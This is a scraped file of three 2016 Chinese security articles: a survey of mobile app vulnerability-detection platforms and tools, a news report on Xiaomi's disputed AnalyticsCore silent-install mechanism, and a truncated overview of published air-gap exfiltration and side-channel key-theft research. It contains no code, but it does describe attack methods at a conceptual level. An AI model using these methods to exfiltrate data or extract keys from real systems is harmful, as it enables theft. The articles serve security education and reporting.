"5ccbfa444f2f0a0a7a69c03d","前言：本文是《移动APP客户端安全笔记》系列原创文章中的第一篇，主要讲的是企业移动APP自动化漏洞检测平台建设，移动APP漏洞检测发展史与前沿技术，APP漏洞检测工具与平台，以及笔者的一些思考。希望能对","silence","前言：本文是《移动APP客户端安全笔记》系列原创文章中的第一篇，主要讲的是企业移动APP自动化漏洞检测平台建设，移动APP漏洞检测发展史与前沿技术，APP漏洞检测工具与平台，以及笔者的一些思考。希望能对移动App自动化漏洞检测感兴趣的同学有所帮助，限于笔者技术水平与文章篇幅，有些内容暂没有逐一详细分析，后续我争取多学习多分享，在此也欢迎大家指点和交流。 一、国内Android App漏洞检测发展简史 1.1石器时代 （2007-2011） 关键词：反编绎，人工审计     2007年11年，Google正式发布了Android操作系统，2011年12月，Google发布了Android 2.3版本，Android 应用市场App数量突破10万个，随着Android系统的完善及Android设备数量的增加，Android超过塞班成为主流智能手机操作系统。与此同时，一些安全研究人员已经敏感的嗅到了Android客户端安全可能会成为未来的安全热点之一，不少传统的二进制安全研究人员开始转战移动安全。 这个时间段国内对Android安全问题的关注主要集中在恶意App分析与检测，App逆向与破解以及Android系统Root。对于Android客户端安全问题刚主要集中在信息泄露，敏感权限使用的方面，通常使用反编绎工具分析APK源码，然后进行人工审计。 图1 使用JD-GUI分析APK反编绎后的Java代码  1.2农业时代 (2012-2014) 关键词：自动化审计、静态分析、动态分析     2012到2014年间，Google发布了Android4.0-5.0系统，此间爆出不了不少Android 相关漏洞，比如影响深远的Webview远程代码执行漏洞，HTTPS中间人漏洞，让越来越多的安全研究人员的焦点慢慢转向Android App客户端本身的安全漏洞挖掘上来。 国内一些厂商也开始研发自己Android App自动化审计系统，其中最早的对外发布的腾讯金刚审计系统算是国内这类产品的鼻祖之一，其早期版本在功能上实现了Android App自动化静态分析与简单的动态分析，审计点包括：明文保存敏感信息，文件权限问题，日志信息泄露，组件权限问题，明文传输，拒绝服务等。 此时遇到Android APP自动化审计遇到的主要问题有：1.静态分析主要依赖于关键词匹配，如果缺少上下文分析与可达性分析，开发者正好自定义了一个相同关键词的函数，或者存在漏洞的代码根本没有调用到，则会产生误报。2、大多Android App的代码与UI是紧密交互的，如果动态分析部分只进行了简单安装启动App与自动随机点击，无法覆盖App大部分界面与功能，则无法覆盖更多的应用执行路径，产生有效业务数据，容易导致漏报。 图2 金刚审计系统主界面 1.3工业时代 (2015-至今) 关键词：模糊测试、污点分析、通用脱壳、UI自动化遍历     从2015年开始，360捉虫猎手（现改名为360显微镜），阿里聚安全等开放的在线Android App漏洞检测平台的出现让开发者和安全研究者更加方便的进行漏洞审计，一些开源在线检测平台的出现（如MobSF）也降低了定制化APP漏洞审计系统的开发门槛。同时模糊测试，污点分析，通用脱壳，UI自动化遍历等学术界与工业界技术也开始被应用到移动App漏洞审计中。下面简单谈谈几种技术在Android App漏洞检测领域的应用，如果有读者感到兴趣的话后续再做详细分享。 1.3.1 Android App Fuzzing     一般而言Fuzzing技术常用于二进制漏洞挖掘，在移动安全领域常见于挖掘系统组件漏洞（如libstagefright），文件解析类应用漏洞（如adobe reader，视频播放器）及第三方组件漏洞，常使用的工具有：peach/afl/honggfuzz，以及DroidFuzzer（https://github.com/manfiS/droidfuzzer）/MFFA（https://github.com/fuzzing/MFFA）等框架，为了提升成功率，通常可将几种工具与框架组件使用，如AFL+PEACH+MFFA。除此之外，fuzzing技术同样可用于测试Android 进程间通信（IPC），比如intent fuzzer（https://github.com/MindMac/IntentFuzzer）可以直接检测App拒绝服务等漏洞。 图3 KCon2016中安全研究人员提出的组合fuzzing框架 1.3.2 Android App 污点分析     污点分析可分为静态污点分析与动态污点分析。静态污点分析不需要运行程序，以FlowDroid为例，目前主流的App静态污点分析技术主要包括如下步骤： 1. 解析应用AndroidManifest.xml，Layout配置文件和相关Dex字节码，根据预先建模的Android LifeCycle Model生成超调用图 ，又称过程间控制流图(Inter-procedural control flow graph, ICFG)； 2. 根据定义的污点源和锚点(Source and Sink)，将其转换为基于ICFG的后向或前向数据流问题进行求解； 3. 根据求解结果，回答是否存在从某输入到输出的数据流流动路径，以显式Intent问题为例，FlowDroid会检测到一个以发送intent的sink方法到最后接收intent的source的路径存在。 动态污点分析则是在程序运行中过程，通过跟踪变量、内存及寄存器的值，依据执行流程跟踪污点数据的传播，最后达到跟踪攻击路径与获取漏洞信息的目的，以TaintDroid为例，需要对Android系统进行定制化修改以便对App运行过程中的污点数据进行跟踪，但由于Android设备或模拟器性能瓶颈问题，动态污点分析无法获取App所有可能的可执行路径。 以往污点分析常用于Android恶意App分析，信息泄露检测等问题，现在越来越多的厂商也应用于App漏洞检测上（如阿里聚安全使用的基于TaintDroid方案）。相比传统的App漏洞检测，污点分析可以跟踪污点数据的传播过程，确定漏洞是否在实际环境中可能被触发，检测能力更加强大。目前也有不少开源的Android污点分析方案与工具如：TaintDroid、FlowDroid、amadroid及CodeInspect，在此之上也发展出一些针对Android App漏洞检测方面的工具，如腾讯科恩实验室Flanker之前开源的JAADS（https://github.com/flankerhqd/JAADAS）。 1.3.3Android App 通用脱壳     App二次打包，破解等问题的泛滥催生了App加固产业的发展，两者技术在也攻防中不断发展和进化，目前国内主流的加固方案有梆梆，爱加密，百度加固，360加固，阿里聚安全，腾讯御安全/乐固，通付盾，NAGA等，对于在线漏洞检测平台来说，如果没有通用的自动化脱壳方案就意味无法对应用市场中的很多App代码进行静态分析，甚至由于应用被加固无法运行于模拟器中或特定测试设备中，影响动态分析结果。 目前针对dex文件加固主流的脱壳方法有静态脱壳、内存dump、Dalvik虚拟机插桩，第一种方法需要针对厂商加密方案不断更新，基本不具备通用性，后面两者的开源代表作有：ZjDroid（https://github.com/halfkiss/ZjDroid）与DexHunter（https://github.com/zyq8709/DexHunter）。 图5 笔者整理的国内部分APP加固方案 1.3.4移动 AppUI自动化遍历     App UI自动化遍历常在App开发测试中用于检测App性能与兼容性，目前在App漏洞检测领域用的比较少（主要由于效率较低）。一般主流的App漏洞检测平台都包含动态分析，主要是安装App后自动运行App并监测App行为，通常使用的是Android Monkey test脚本或其它工具随机点击APP界面。实际上，为了更深入的检测App敏感信息泄露与后端WEB接口漏洞，仅靠随机点击App界面进行动态分析是不够的（比如现在大部分App功能需要注册登录后才能使用），如果能更好的模拟正常用户使用App的过程，则可以扩展监测Logcat日志，本地文件存储，网络通信等数据审计能力。     目前APP UI测试框架按原理可分为黑盒与白盒两种，白盒测试需要在App开发时添加测试组件并调用，需要App完整源码，黑盒测试一般提取App界面的UI元素并根据算法进行遍历，无需App源码。笔者推荐的黑盒APP UI测试框架与工具主要有AndroidViewClient（https://github.com/dtmilano/AndroidViewClient）及国人基于Appium开发的appCrawler（https://testerhome.com/topics/5718）。 图6 appCrawler生成的APP测试报告 二、Android App漏洞检测 2.1 国内Android App在线漏洞检测平台 腾讯金刚审计系统 http://service.security.tencent.com/kingkong 免费 无限制 腾讯御安全 http://yaq.qq.com/ 免费 查看漏洞详情需认证 阿里聚安全 http://jaq.alibaba.com/ 免费 查看漏洞详情需认证 360显微镜 http://appscan.360.cn/ 免费 无限制 360APP漏洞扫描 http://dev.360.cn/html/vulscan/scanning.html 免费 无限制 百度MTC http://mtc.baidu.com 9.9元/次 无限制 梆梆 https://dev.bangcle.com 免费 无限制 爱内测 http://www.ineice.com/ 免费 无限制 通付盾 http://www.appfortify.cn/ 免费 无限制 NAGA http://www.nagain.com/appscan/ 免费 无限制 GES审计系统 http://01hackcode.com/ 免费 无限制 注：排名不分先后 2.2开源Android App漏洞检测工具 1.MobSF     Github:https://github.com/ajinabraham/Mobile-Security-Framework-MobSF Mobile Security Framework(MobSF)是印度安全公司（http://opensecurity.in）开发的一个智能化、一体化的开放源代码的移动应用（Android / iOS）自动化测试框架，支持静态和动态分析，App后端Web API漏洞检测。 主要特点：基于Python Django的开源在线漏洞检测框架，前端UI完善，基础功能全面，安装布署方便，但总体来说审计点偏少，不适合实战，更适合辅助分析与二次开发，国内目前不少在线APP检测的平台都有这个框架的影子。 图7 MobSF生成的检测报告 2.Drozer     Drozer是MWR Labs开发的一个开源Android 安全测试框架，支持编写自定义模块。目前已经有不少介绍Drozer文章，这里就不多说了。 图8 Drozer运行界面 3.Marvin Github:https://github.com/programa-stic/ Marvin是西班牙Programa STIC组织发布一个开源Android App漏洞检测框架，该框架主要分为四个项目： （1）Marvin-Django 主要包含框架前端UI界面与数据库部分； （2）Marvin static analyzer 一个主要基于Androguard 及Static Android Analysis Framework (SSAF)的Android App静态分析引擎。 （3）Marvin Dynamic Analyzer 一个APP动态分析引擎，基于OpenNebula及Android-x86 模拟器，可搭建分布式分析系统，用于复现静态分析发布的漏洞与动态检测漏洞。 （4）Marvin toqueton 一个自动化遍历APP UI的工具，用于分析APP UI控件并进行自动化交互遍历，辅助动态分析。 主要特点： 笔者刚看到这个项目发布时研究了一番，主要特点有可直接搜索下载Google应用商店或者上传应用进行分析，可编写自定义静态分析脚本，使用动态引擎复查静态分析的结果提升准确性，使用本地应用去遍历APP UI等，但仔细实践后发现动态分析环境（ubuntu+openNebula+Android-X86）的布署很麻烦，多次尝试都未成功。 4.Inspeckage https://github.com/ac-pm/Inspeckage 一个Xposed插件，用于调试分析Android App。 主要特点： 使用方便，自带WEB界面，装Xposed插件可以分分钟开始挖漏洞；2.功能全面：查看Manifest信息，监控本地文件读写，查看文件内容，查看Logcat日志，查看网络通信请求（支持SSL uncheck），监控IPC通信，查看加密操作，调用未导出组件等。 图10 Inspeckage主界面 三、iOS App漏洞检测     一般来说iOS App由于iOS系统安全限制（非越狱环境），且无法直接反编绎获取App源码，其在安全性上远高于Android App，但近两年前随着XcodeGhost(https://security.tencent.com/index.php/blog/msg/96)，iBackDoor，AFNetworking中间人等后门事件与漏洞的曝光，iOS App安全性也慢慢受到国内开发者与安全研究人员的关注。 3.1 常见iOS App漏洞测试工具     测试iOS App安全性离不开一台越狱过的iOS设备，以及一些测试利器。在此简单简介两个iOS App安全测试工具： 1.Idb 图11 Idb主界面 官网：http://www.idbtool.com Github：https://github.com/dmayer/idb Idb是一款开源的iOS App安全评估工具，作者是Danl A.Mayer。 主要功能： 1.查看应用以下信息：应用包名；注册的URL Schemes；SDK版本；应用数据文件夹位置；应用权限等， 2.查看/下载应用数据文件； 3.查看应用文件保护级别； 4.Dump iOS keychain； 5.检测应用是否加密； 6.检测应用编绎安全选项(ASLR/PIE, DEP, ARC)； 7.查看应用的shared libraries； 8.提取应用binary中的字符串； 9.Class dump; 10.查看应用URL Handler； 11.Invoke and fuzz URL handlers； 12.查看系统剪切板 13.截屏 14.安装系统证书； 15.编辑 /etc/hosts文件； 16.查看系统日志； 2.Needle 图12 Needle主界面 Github：https://github.com/mwrlabs/needle Needle是MWR Labs开发的一个开源iOS安全测试框架，同样支持开发自定义模块来扩展Needle的功能，目前主要功能包含对iOS应用数据存储，IPC，网络通信，静态代码分析，hooking及二进制文件防护等方面的安全审计。 与drozer类似，Needle提供了一个shell界面，基本idb有的功能needle都有或者说以后也会有（因为可以自己写模块），而Needle还同时支持Cycript与Frida两个hooking方案，可以方便的加载hook脚本与执行命令。 3.2 iOS App自动化漏洞检测     在很长一段时间内，iOS安全研究都主要集中在iOS系统安全漏洞挖掘中，由于iOS相对安全的系统机制保护与严格的审核机制，iOS App安全性一般比Android App要高不少，历史上出现的过一些iOS App漏洞也主要集中在iOS越狱环境下，但近年来XcodeGhost，AFNetworking框架中间人漏洞以及多个恶意SDK曝光也说明了iOS App安全性并没有我们想像的那么高，建设iOS App自动化漏洞审计平台对于拥有大量iOS App产品的企业来说还是很有必要的。 为了提升公司iOS App安全漏洞审计能力与应急能力，笔者与riusksk（林大夫）从2015年底开始一起研发iOS App漏洞审计系统（后续并入金刚），目前已经成功上线近半年，也辅助发现了一些iOS App业务安全漏洞，详情可参考文章：https://security.tencent.com/index.php/blog/msg/105 此外360NirvanTeam（http://nirvan.360.cn）也上线了在线检测功能，开源方案MobSF也有iOS App在线审计功能。此类审计平台主要审计点有：BIN文件分析，第三方库漏洞检测，XCodeGhost检测，恶意SDK检测等。相对来说金刚更为全面，适合开发上线前自查与安全研究人员辅助分析，包含了私有API检测，开放端口检测，应用文件审计，网络通信数据审计，日志审计，classdump等功能，后续还会继续优化iOS App UI自动化遍历功能与URL scheme Fuzzing功能。 图13 TSRC iOS App漏洞审计报告部分内容 四、构建移动App漏洞检测平台     目前国内无论是3BAT，还是移动安全公司，都已经提供了移动APP漏洞检测产品，笔者平时也会对这些平台做一些深度体验，总体来说随着技术发展，构建APP漏洞检测平台门槛已经很低技术也很成熟了。 在移动互联网时代，不同的企业对于移动APP产品安全性要求是不一样的，如金融，支付，通信，游戏类APP产品对App客户端安全，业务安全，后端服务器安全都提出了很高要求，定制企业自已的移动APP漏洞检测平台还是很有必要的。 笔者仅从个人角度谈谈对如何构建移动App漏洞检测平台的几点看法： （1）在平台建设之初可以参考业界优秀的同类产品与开源方案，目前大部分移动App漏洞检测平台后端基本功能都是使用Python/Java开发，便于快速开发迭代。 （2）移动APP安全威胁是不断变化的，漏洞审计规则也应该支持快速更新，同时企业移动App漏洞检测平台应该满足移动App产品正式上线前审计，上线后日常排查两个基本需求。 （3）很多开发人员和安全工程师对漏洞的理解是不一致的，在输出漏洞检测报告后，还需要提供详细的漏洞利用场景讲解与修复指引。 （4）多多关注学术界与工业界的新研究成果，如果能加入优化与利用，可以推动平台整个技术能力的进步。 （5）平台的主要建设者应该精通移动App漏洞挖掘实战，能够针对企业重点产品特性（如动态加载，热补丁等技术）提供专业的解决方案。同时笔者提出了一个甲方/乙方企业通用的移动App漏洞检测平台架构，企业可以在此基础上直接接入Web漏洞扫描系统扫描App后端Web漏洞，也可以收集URL测试业务安全漏洞。 图14 移动App自动化漏洞检测平台架构 五、未来移动App漏洞检测平台发展方向      在Google最新发布的Android 7.0系统增加了不安全特性，如APP开发者可以使用系统提供的接口自主配置信任的证书，默认也不再信任用户安装的第三方CA证书，此举可提升Android App网络通信的安全性。 可见未来移动APP安全问题还将不断变化，目前大部分移动APP漏洞检测平台最终的检测结果也需要专业的安全研究人员评估实际风险，历史上很多移动端严重漏洞也是需要结合业务场景的，所以说移动App漏洞检测平台也只是企业移动App安全建设中的一环，此外推动移动安全人才培养，移动App安全开发规范，应用加固，盗版监测等体系建设也同样重要。 笔者个人认为未来移动APP漏洞检测平台可发展的几个方向有： 1.机器学习     机器学习在网络安全领域常用于恶意软件检测，流量检测等方面，目前也已经出现一些利用机器学习进行Android恶意应用等方面的开源工具（https://github.com/mwleeds/android-malware-analysis）与研究，未来同样也可能应用于Android App漏洞检测。 2.威胁感知与大数据     如何从移动App中挖掘数据，并分析，整合进而利用于漏洞检测与威胁感知也是未来移动APP漏洞检测发展方向之一。目前部分漏洞检测平台已经开始支持采集应用市场所有移动APP源码及运行过程中产生的网络通信数据（如域名，IP，URL等），进行聚合分析与WEB接口漏洞检测。同时四维智创，梆梆等安全公司开始推广移动应用威胁感知产品，此类产品通过SDK收集应用的行为与网络数据，用于检测APT攻击，防刷单等场景。 3.社区化     目前国内已经有一些社区化的WEB漏洞检测平台，如Seebug，Tangscan等，盘古即将公测的Janus（http://appscan.io）也同样开始主打社区化，Janus支持社区用户自定义检测规则，后台结合海量全网应用数据，可用于全网应用快速漏洞扫描。同时社区化加入了安全研究员的人工审计流程，后续可以不断提升漏洞特征建模的细度与广度，提升平台检测能力。 文章纯属原创，转载请注明出处，同时感谢lake2，riusksk，Flanker，小荷才露尖尖角，瘦蛟舞的指点。 参考资料： [1] http://www.ijcaonline.org/research/volume134/number7/dhavale-2016-ijca-907855.pdf [2] http://www.droidsec.cn/ [3] https://loccs.sjtu.edu.cn/ [4] http://jaq.alibaba.com/community/index.htm [5] http://drops.wooyun.org/ [6] https://blog.flanker017.me/","2016-09-13 13:55:48","移动安全","移动APP漏洞自动化检测平台建设","http://nsoad.com/Article/MobileSecurity/20160913/389.html"
"5ccbfa444f2f0a0a7a69c03e","手机制造商采用定制版Android系统是众所周知的事情，不仅如此，这些厂商还会在系统中预装一些定制的应用，比如音乐、时钟、短信等。这是Android手机厂商实现差异化竞争的一个方面。典型的比如国内的小米MI","Kong","手机制造商采用定制版Android系统是众所周知的事情，不仅如此，这些厂商还会在系统中预装一些定制的应用，比如音乐、时钟、短信等。这是Android手机厂商实现差异化竞争的一个方面。典型的比如国内的小米MIUI，就算得上针对Android系统的高度定制。            但是手机制造商将这些App和服务安装在你手机上是否也会有特别的目的？这些预装的应用又是否会威胁到机主的安全和隐私？            国外媒体Hack News报道称，为了解开这些疑惑，来自荷兰的计算机系学生Thijs Broenink，调查研究了自己小米Mi4手机。他意外发现这款手机预装了名为AnalyticsCore.apk的应用。该应用在后台24 x 7小时持续运行，而且即便手动删除也还会再生。这就让人很好奇，AnalyticsCore.apk究竟是做什么用的。小米是全球最大的手机运营商之一，但这已经不是国外媒体首次针对小米手机扩散恶意程序做出指控了：包括在未经用户许可的情况下窃取用户数据，MIUI系统中许多应用包含大量广告等。小米可以在用户不知情的情况下安装任意APPBroenink在小米论坛就AnalyticsCore.apk应用的问题发了帖子 ，在没有得到小米的任何回复。于是他自己对代码进行了逆向，发现该应用每24小时就会向小米官方服务器发送检查请求，查看服务器上是否有AnalyticsCore.apk的更新版本。在发送请求的同时，该应用还会将设备的标识信息一起发送过去，包括本机的唯一IMEI、型号、MAC地址、Nonce、 package名及签名。如果小米服务器上有名为Analytics.apk的软件更新包，小米就会在神不知鬼不觉的情况下自动下载安装更新，用户完全不会察觉到。Broenink在他的博客中写道：“我没能在这个应用内部发现什么证据，猜测有更高权限的小米App在后台进行更新安装。”抛开AnalyticsCore.apk究竟是做什么的不谈，这种更新方式是否存在安全隐患也很值得探究。Broenink就发现，在应用的整个自动安装过程中，似乎不会对APK进行验证。这也就意味着，黑客也是可以利用这一过程的。或者可以这么说，小米可以将任意App命名为”Analytics.apk”，然后放到服务器上，手机就会在后台自动下载安装这款应用。Broenink说：“看起来，小米可以在24小时内将任意App安装到你的手机上。虽然具体的更新时间不能确定，但我很想知道，有没有可能尝试将用户自己的Analytics.apk安装包放在相应的目录下，观察它会在什么时候执行安装动作。”黑客也可以利用这个漏洞Broenink没能发现这款App的真正目的是什么，也就无从了解小米为什么要在自己上百万用户的设备里留下这个神秘的后门。这样一来，任何情报机构的黑客只要发现了这个后门，就可以在短短24小时内将恶意软件安装在上百万的小米用户手机上。    更悲剧的是，升级过程是通过HTTP连接接收更新内容的，整个过程完全能用来进行中间人攻击。Broenink认为“这是个很明显的弱点，因为入侵者已经获取了你的IMEI和手机型号，他们可以为你的手机安装特定的安装包。”很多用户都在小米论坛上表达了对这个神秘安装包的存在和目的表示担忧。其中一个用户留言：“它到底是做什么用的，每次删除之后还会再次出现。”另一个用户说道：“我用第三方应用查看电量使用情况占比，这个应用总在最上面，我觉得它肯定吃了很多系统资源。”那么如何屏蔽这样的秘密安装呢？权宜之计是利用防火墙屏蔽掉所有通向小米相关域名的连接。小米官方声明：一切为了用户体验一位来自小米的发言人联系到Hack News，并对Thijs Broenink提出的秘密后门问题发出了官方声明。声明中提道：“AnalyticsCore是内建在MIUI系统中的组件，主要用来分析数据以增强用户体验，比如说MIUI Error Analytics——小米的系统错误分析功能。”另外，小米还澄清道说这个功能绝不会被黑客利用。   “为了安全起见，MIUI会在软件的安装和升级期间检查Analytics.apk应用签名，以确保载入的是拥有正确签名的官方安卓软件包。”小米发言人补充道。“没有官方签名的安卓安装包会被拒绝安装。我们的软件的自动升级功能都是为了更好的用户体验。在今年四月到五月期间发布的最新版本MIUI v7.3中，HTTPS协议能够有效地保障数据传输安全，避免中间人攻击。”我们还会进一步关注小米未经用户同意就在后台自动下载App这一事件。* 参考来源：TheHackerNews，本文由孙毛毛编译，转载请注明来自FreeBuf（Freebuf.COM）","2016-09-19 14:28:52","移动安全","可远程安装任意APP，小米手机藏后门？小米官方否认","http://nsoad.com/Article/MobileSecurity/20160919/418.html"
"5ccbfa444f2f0a0a7a69c03f","0&times;00 前言USRP是数款流行的SDR硬件中功能和应用都相对成熟的一款产品，从WIFI协议、ZigBee协议、RFID协议、GSM通信系统、LTE 4G通信系统到飞机通信、卫星通信USRP都能","silence","如何从不联网的电脑中盗取1KB名叫《新建文本文档》内容为 test 的txt文件？实际上这个是FreeBuf小酒馆里面的某个问题，当然，回答也很喜感…..    这个问题描述的非常像是一个闭塞网络，但闭塞网络并不是完全安全的，有很多种办法可以从脱离互联网的电脑中窃取数据。每一种方法都依赖于不同的方式传输数据，包括声信号和电磁波。有一些系统的网络流量为了避免敏感数据被窃取都被经过精心监控和检查，但他们仍然可以被上述方法窃取数据。2015年3月 – BitWhisper – 通过散热量侵入闭塞网络PC在2015年，以色列本-古里安大学的安全研究者（Mordechai Guri，Matan Munitz 和Yuval Elovici教授）设计了一种可以从闭塞网络中的计算机窃取信息的隐蔽方法，这种方法是使用在一个电脑旁边的机器探测它产生的热量。这种技术被称为BitWhisper，它可以被用来窃取密钥或者其它多种敏感信息。这种方法需要在两台计算机之间构建一个桥梁——BitWhisper，研究人员示范了如何利用它在两个闭塞系统之间传递数据。这个通道依赖于一种称为“热坪”（thermal pings）的东西，专家们使用这个术语描述通过接近和加热的方式来辨认两个网络的反复融合。BitWhisper技术会使用病毒中的组件发射的热量在两台电脑之间建立双向通信。专家解释说，如果想从孤立的计算机中盗取信息必须要在同一个闭塞网络中感染这台计算机。“BitWhisper提供了一个可行的隐蔽通道，很适合用来传递命令和控制信息，以及泄漏类似于密码的敏感数据片段”。研究人员发表了一篇标题为“BitWhisper：在接入闭塞网络的电脑中使用热能手段建立的隐蔽信道”的论文，描述了BitWhisper技术以及他们实验的调查结果。报告中这样写道：“在这个阶段，攻击者可以和曾经的孤立网络进行通信，发送命令并获取响应。”专家们将两台计算机放置在距对方15英寸的位置上，然后他们试着每小时发送8bit的数据。这个数据量足以盗取类似用户登录信息，密钥之类的敏感数据了，同时也足以向靶机中的监听器发送指令。在它们的实验方案中，研究人员将两台电脑互相平行放置，其中一台机器连进了互联网，另一个则接入闭塞网络。研究人员在两台电脑中植入了恶意代码，在发送端，热量由内部组件元件产生（比如CPU和GPU），这些热量被发送到监控温度变化的接收端。研究人员解释道：“BitWhisper使用一种控制方式通过从一台PC向另一台发送热量建立了一个隐蔽通道。通过控制加热模式，二进制数据被转化为热信号。反过来，旁边的PC用固有的热量感受器去度量环境变化，这些变化随后会被采样处理，然后被调制成二进制数据。”BitWhisper攻击是十分复杂的，但它同时也很有趣，因为它不需要任何专用的或者修改的硬件。 2015年6月 – 利用泄漏的无线电信号从PC盗取加密密钥来自特拉维夫大学的研究人员Daniel Genkin，Lev Pachmanov，Itamar Pipman和Eran Tromer开始了由Genkin和他的同事主持的项目，这个项目试图通过在一个破译例程内分析独立PC的CPU发出的声音来窃取数据。Genkin示范了如何破解4096-bit的RSA，同时他和他的新团队解释了加密密钥可以被偶然地通过声波从PC泄漏出来。在Genkin的第一次研究中，专家们示范了如何在几秒钟之内通过分析在笔记本电脑在破译指定密文时产生的电磁辐射（electromagnetic emanations）从它的GnuPG中拿到私有密钥。在他们的第二次实验中，Genkin和他的同事用一个?Funcube Dongle Pro+ 连接到一台嵌入安卓系统的Rikomagic MK802 IV电脑测量1.6和1.75MHz之间的发射信号。这组人进行的这次实验的详情写在一篇题目为“Stealing Keys from PCs using a Radio: Cheap Electromagnetic Attacks on Windowed Exponentiation”的论文中。研究人员使用一台标准的AM收音机，同时用一台移动安卓设备记录了输出音频。他们在几分钟内就拿到了好几台GnuPG系统的笔记本电脑的密钥。论文中这样写道：“我们示范了如何在50厘米远使用几秒钟通过非侵入测量电磁辐射的方式从笔记本电脑中获取密钥。这种攻击可以使用便宜的遍地都是的设备来实现：消费级的无线电接收器或者一个软件定义无线电USB加密狗（Software Defined Radio USB dongle）。安装起来结构紧凑，操作起来不受限制，而且可以被轻松地隐藏起来：比如藏在一个皮塔饼里面。普通的笔记本电脑还有流行的RSA和ElGamal加密方法都很容易受到这种攻击，包括那些使用现代幂算法进行加密的，比如滑动窗口、甚至它的旁路抵抗变体（side-channel resistant variant）、固定窗口幂。”“我们成功地从多种型号的运行GnuPG（著名的开源编码软件，实行OpenPGP标准）的笔记本电脑中获取了密钥，在几分钟之内，攻击者发送了一些经过精心制作的密文，当它们被目标机解码的时候，它们就会触发一个在解码软件中特殊结构的值。使环绕在笔记本电脑周围的电磁场产生可被观察到的波动，波动取决于密钥的bits。密钥可以从这些波动中通过信号处理和密码破译被推断出来。”专家们在这项研究中使用的技术并不是新的。尽管攻击成功了，但是研究人员们强调这种攻击还是并不容易实现。因为电脑在同一时间进行精细的多任务处理导致分析出某个特定的类似于破译密码的动作几乎是不可能的。2015年7月 – 通过非智能手机来攻击闭塞网络几乎每个敏感的工作环境都会采取严格的保密措施，对闭塞网络中的电脑的使用已经非常普遍。比如禁止对内部员工往电脑里插优盘。保安政策禁止员工携带智能手机。尤其在工作涉及敏感的贸易信息或者关于机密信息的管理问题等。如何攻击一台从互联网隔离的计算机设备？如果说这不需要不需要任何技术能力或者设备你可能还不信。黑进闭塞网络中的计算机你只需要一部手机，即使是用十年前的老手机也没问题。一队以色列安全研究员发明了一种新的攻击方式用来从脱离web的电脑中窃取数据。这种攻击能够从十分安全的计算机中窃取数据。他需要用到：GSM网络一部非智能手机电磁波Moradechai Guri 是这个有趣的研究的安全研究员们背后的领导人。他和她的同事Gabi Kedma，Yisroel Mirsky，Ofer Hasson，Assaf Kachlon，Yuval Elovici一同工作。这组专家使用一台用了九年Motorola C123手机来执行攻击。它们在目标电脑上和手机里都装了一个恶意软件，数据被电脑发射的电磁波由研究人员们自己开发的这个恶意软件劫持下来。这意味着攻击者得先黑进目标电脑并且把这个恶意软件装进去，才能够从这台独立PC中窃取数据。研究人员在他们的论文中说道：“不像最近这方面的其它事例，几乎可以肯定这些漏洞组件在任何桌面端或者服务器、使用蜂窝网的手机上都可以被利用。”2015年8月 – Funtenna 能够利用声波从远处闭塞网络窃取数据使用声波是另一个从一个脱离互联网的电脑中发送数据的方式。一组专家发明了一种叫做Funtenna的革命性的黑客技术。它可以被任何攻击者拿来从目标电脑中盗取数据，即使这个电脑是处于闭塞网络中的。“Funtenna是一个只使用软件的技术。它会导致现代计算机为了隐蔽的目的的硬件在广谱（wide spectrum）上有意地暴露信息，可靠的数据泄漏会发生在安全的闭塞网络中。我们提出了一个广义的Funtenna技术，它能够在大部分的电磁波谱上可靠地进行编码并发出任意数据。这些电磁波谱由副声（sub-acoustic）到射频（FM）甚至更多。在黑帽会议上的谈话描述这样说道：“Funtenna技术是和硬件无关的，它几乎可以在所有的现代电脑操作系统中以及嵌入式系统中使用，并且专门设计成了不在RF发射器之类的硬件设备中运行的形式。”红气球安全公司的研究人员Ang Cui提到说这是一个巨大的发现。Futenna无线电信号攻击可以允许攻击者利用物联网设备上网窥探任何目标。游戏机，打印机，洗衣机和冰箱都能从电脑中窃取数据，虽然它们没有被连进互联网。但是在这种情况下，目标电脑必须得是暴露出来的。攻击者需要安装能够控制设备电路（通用输入／输出电路）的恶意软件。数据会随着你把它们的震动频率掉到特定值后产生的信号发送出去。攻击者随后可以使用AM无线电天线捕捉到震动产生的信号。随后Funtenna就可以在很短的距离中被定位。Funtenna攻击法可以使攻击越过任何网络安全方案。Ang Cui这样说的：“你有网络侦查，防火墙……但是它使用的传输数据的方式这些东西全都监视不到。这彻底地挑战了我们网络安全的程度。”2016年6月 – 如何通过PC产生的噪声在空气中窃取密钥以色列的一组研究人员（Daniel Genkin, Lev Pachmanov, Itamar Pipman, Adi Shamir, Eran Tromer）示范了如何使用一个闭塞系统通过声音信号在一个10米的范围内窃取一个4096bit的密钥。这个技术运行起来也非常迅速，专家们仅在几秒钟之内就窃取到了这个密钥。同样的一组人曾在2015年证明了密钥可以意外地从一个PC无线电波中泄漏出来。随后他们又演示了用一套便宜的装备就可以实现这些。现在研究人员们发现了一个现象，处理器会在它们改变电流流经它们的组件时发射高频的”线圈呜咽（coil whine）”。专家们发表的论文这样写道：“CPU和相关芯片消耗的电量在不同时间做不同运算时会发生剧烈的变化（好几瓦）。PC内部供电系统中的电子元件会试图对芯片提供恒定的电压，这是电流和电压产生机械波动的原因。产生的震动会被传播进周围的空气，产生高亢的噪声，就是前面说的‘线圈呜咽’，即使它通常来源于电容器，因为这些噪声同正在进行的运算有联系。它会泄漏出什么程序正在运行以及它们之间正在传输什么样的数据。”比较有戏剧性的是，它会在进行加密操作的过程中通过声音泄漏密钥。在目标用RSA算法解密密文（由攻击者发送）时就可以记录下来这个过程所产生的噪声，一个高级的4096bit的RSA的密钥就会在一小时之内被解出来。这个技术的最大缺点是相关设备很难被隐藏。所以研究人员试图将移动电话的麦克风放在目标机器30厘米远的位置来获得相同的效果。论文上写到：“我们通过在距电脑10米远的距离使用抛物线麦克风（如上图）和30厘米远的普通手机进行了实验来演示了这个攻击。”“在某些情况下，甚至可以通过接近目标的手机的内部麦克风来运行攻击者的移动应用来录制目标的声音。”他们组甚至能够使用手机在一小时的监听中获取4096bit的RSA密钥。专家们说道：“侧信道泄漏可以被一些物理方法减弱：通过吸音罩对抗声波攻击，法拉第笼对抗电磁攻击，绝缘罩对抗底盘和触摸攻击，还有光电解耦或者光纤连接的方式对抗电缆远端攻击。”研究人员推荐了一些抵抗这种侧信道攻击的方法，他们提议在特定情况下可以使用PC内部的声学阻尼。他们还建议可以在他们的软件中插入编码器，通过在加密时伪造一些计算来对这个过程进行“致盲”。这样就使得抵御广角侧信道攻击包括声学方面的攻击成为了可能。2016年6月 – Fansmitter – 通过风扇噪声从闭塞设备中窃取数据内盖夫本-古里安大学由Mordechai 